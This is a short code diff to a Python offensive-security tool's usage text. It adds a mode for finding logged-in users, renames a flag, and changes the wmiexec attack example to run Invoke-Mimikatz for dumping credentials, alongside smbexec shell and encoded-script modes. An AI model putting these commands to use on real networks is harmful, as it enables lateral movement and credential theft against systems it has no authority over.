@@ -304,10 +304,12 @@ def wmi_test(usr, pwd, dom, dst):
 def main():
     # If script is executed at the CLI
     usage = '''
+Find Logged In Users
+    %(prog)s [-i IP] [--dom Domain] [--usr Administrator] [--pwd Password1] --scout
 Command Shell:
-    %(prog)s [-i IP] [--user Administrator] [--pwd Password1] [-t target] --smbexec -q -v -vv -vvv
+    %(prog)s [-i IP] [--usr Administrator] [--pwd Password1] [-t target] --smbexec -q -v -vv -vvv
 Attack Directly:
-    %(prog)s [-i IP] [--user Administrator] [--pwd Password1] [-t target] --wmiexec --invoker -q -v -vv -vvv
+    %(prog)s [-i IP] [--usr Administrator] [--pwd Password1] [-t target] --wmiexec --invoker -x /root/Invoke-Mimikatz.ps1
 Create Pasteable Double Encoded Script:
     %(prog)s --invoker -q -v -vv -vvv
 '''
@@ -421,6 +423,7 @@ Create Pasteable Double Encoded Script:
     attacks = True
     method_dict = {}
     dst = ""
+    test = ""
 
     # Get details for catapult server
     cwd = str(os.path.dirname(payload))
